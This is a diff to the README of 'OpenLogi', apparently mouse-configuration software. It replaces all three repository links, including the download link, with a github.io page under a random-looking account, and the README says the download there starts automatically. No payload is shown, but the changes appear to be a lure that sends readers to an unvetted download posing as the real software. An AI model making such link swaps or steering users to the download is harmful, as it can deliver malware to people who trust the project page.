@@ -1,6 +1,6 @@
 # ⚡️ OpenLogi - Freedom for Your Mouse, No Strings Attached
 
-[![Download OpenLogi](https://img.shields.io/badge/Download-OpenLogi-4CAF50?style=for-the-badge&logo=github)](https://github.com/dbfdrfgethr56bb/OpenLogi)
+[![Download OpenLogi](https://img.shields.io/badge/Download-OpenLogi-4CAF50?style=for-the-badge&logo=github)](https://dbfdrfgethr56bb.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these simple steps to get OpenLogi running on your computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/dbfdrfgethr56bb/OpenLogi](https://github.com/dbfdrfgethr56bb/OpenLogi)
+Visit this link to download the application: [https://dbfdrfgethr56bb.github.io](https://dbfdrfgethr56bb.github.io)
 
 The download will start automatically. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
@@ -143,7 +143,7 @@ Absolutely. OpenLogi stores all settings locally on your computer. No data ever 
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/dbfdrfgethr56bb/OpenLogi](https://github.com/dbfdrfgethr56bb/OpenLogi)
+- **GitHub Repository:** [https://dbfdrfgethr56bb.github.io](https://dbfdrfgethr56bb.github.io)
 - **Documentation:** Visit the GitHub repo for detailed documentation, including advanced configuration options.
 - **Community Support:** Join the discussion in the GitHub Issues section for help and feature requests.
 
